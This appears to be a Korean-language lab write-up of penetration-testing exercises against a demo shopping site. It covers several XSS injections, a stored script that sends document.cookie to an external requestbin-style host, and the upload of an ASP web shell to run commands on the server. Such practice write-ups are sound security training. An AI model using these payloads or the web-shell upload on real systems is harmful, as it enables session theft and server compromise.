# Penetration-Testing2 - XSS, File upload

### XSS
1. Quick Search 입력창에 <script>alert("xss")</script>

![image](https://user-images.githubusercontent.com/82012857/176285803-79bdef8f-342d-40e9-8d71-d057434fc1d6.png)


2. 게시판에 HTML로 <script>alert(document.cookie)</script>

![image](https://user-images.githubusercontent.com/82012857/176285816-a06795fa-2c6f-493d-84bb-dfa9f91eca7d.png)

3. 아이디 중복확인의 URI에서 id값을 <script>alert("xss")</script>로 대치함

![image](https://user-images.githubusercontent.com/82012857/176285835-ebdf1ca5-a36f-4333-bdaa-61814d011795.png)
![image](https://user-images.githubusercontent.com/82012857/176285846-af12d59e-8331-4e29-ab7e-ff1c3668f403.png)

4. Advances Search의 검색어 Best10에 들어가서 URI부분에 http://61.39.155.24:50003/demoshop/shop/shop_searchresult.asp?frmSearchWord= 의 파라미터를 <script>alert("xss")</script>로 대치함

![image](https://user-images.githubusercontent.com/82012857/176285862-e6d4d8fb-487e-41d2-a295-cedf6f537ba8.png)
![image](https://user-images.githubusercontent.com/82012857/176285890-f1d80d40-cbec-4cad-9097-31ab7f494afc.png)

5. Keyword를 Search하는데 프록시를 켜고 Burp Suite 툴을 통해서 전송 값을 인터셉트하고 s_brand의 값을 BeneFit에서 <script>alert("xss")</script>로 대치하여 Forward

![image](https://user-images.githubusercontent.com/82012857/176285966-4f6da73a-69f2-4fd5-9717-af2e4068e242.png)
![image](https://user-images.githubusercontent.com/82012857/176285977-91ee3bee-f6e5-4d4c-88b0-06692f8cae02.png)
![image](https://user-images.githubusercontent.com/82012857/176285983-327fde04-1f58-43fb-a9b5-57c6a21e5e1c.png)

6. 게시판에 requestbin주소 스크립트를 올려서 클릭을 유도
/* <script>image = new Image();image.src=
'[https://en56a9kxt5rsp.x.pipedream.net/?'+document.cookie;</script](https://en56a9kxt5rsp.x.pipedream.net/?%27+document.cookie;%3C/script)> */

![image](https://user-images.githubusercontent.com/82012857/176286717-ff7c94a8-2e6a-4a8e-94f2-f43aa52d28cf.png)
![image](https://user-images.githubusercontent.com/82012857/176286728-3c68b3b5-eae2-4e52-a6d5-7d953725d89a.png)

#
### 파일 업로드
Board에 webshell.asp파일을 업로드하고 URI에서 상위경로 확인
http://61.39.155.24:50003/demoshop/shop_board/
상위 경로에서 upload_file에서의 자신의 파일을 찾고 파일을 클릭하면 cmd화면이 나옴
그 후 ipconfig하면 ip확인 가능

![image](https://user-images.githubusercontent.com/82012857/176286899-a25f5e22-f54f-48fc-b80e-7c3e7ef32116.png)
![image](https://user-images.githubusercontent.com/82012857/176286911-5827c256-5832-465e-8316-015736a1ccbe.png)
